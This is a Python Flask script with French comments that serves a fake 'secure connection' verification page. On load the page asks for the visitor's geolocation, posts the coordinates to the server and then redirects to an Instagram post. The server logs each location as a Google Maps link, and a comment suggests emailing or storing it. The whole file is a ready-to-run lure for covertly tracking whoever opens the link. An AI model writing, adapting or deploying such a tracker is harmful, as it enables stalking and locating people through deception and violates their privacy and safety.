from flask import Flask, request, jsonify, render_template_string
import os
import requests

app = Flask(__name__)

# Récupère l'URL de redirection depuis une variable d'environnement
redirect_target_url = os.environ.get("REDIRECT_URL", "https://www.instagram.com/p/DBeT6YDPC9k/")

landing_page_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>Connexion sécurisée</title>
    <script>
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        fetch('/capture-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ lat: latitude, lon: longitude })
                        })
                        .then(() => {
                            window.location.href = "{{ redirect_url }}";
                        })
                        .catch(() => {
                            window.location.href = "{{ redirect_url }}";
                        });
                    },
                    function () {
                        window.location.href = "{{ redirect_url }}";
                    }
                );
            } else {
                window.location.href = "{{ redirect_url }}";
            }
        }
    </script>
</head>
<body onload="captureLocation()">
    <p>Merci de patienter pendant la vérification de votre connexion...</p>
</body>
</html>
'''

@app.route('/redirect')
def redirect_page():
    return render_template_string(landing_page_template, redirect_url=redirect_target_url)

@app.route('/capture-location', methods=['POST'])
def capture_location():
    data = request.get_json()
    latitude = data.get('lat')
    longitude = data.get('lon')

    print(f"📍 Localisation reçue : Latitude={latitude}, Longitude={longitude}")
    map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    print(f"🗺️ Google Maps : {map_url}")

    # Tu peux ici envoyer par email, stocker en DB, etc.
    return jsonify({"status": "success", "latitude": latitude, "longitude": longitude, "map_url": map_url})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
